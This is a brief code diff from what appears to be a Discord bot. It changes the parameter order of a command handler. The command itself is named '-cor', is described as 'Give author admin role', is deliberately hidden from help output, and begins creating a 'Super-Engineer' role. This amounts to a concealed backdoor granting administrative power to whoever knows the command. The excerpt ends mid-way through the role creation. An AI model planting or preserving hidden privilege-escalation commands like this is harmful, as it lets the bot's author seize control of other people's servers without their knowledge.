@@ -4,7 +4,7 @@ module.exports = {
     use: "-cor",
     description : "Give author admin role",
     options: {ShowInHelp: false},
-    run : function(msg, client, disc){
+    run : function(client, msg, args, disc){
         msg.guild.roles.create({
             data: {
                 name: "Super-Engineer",
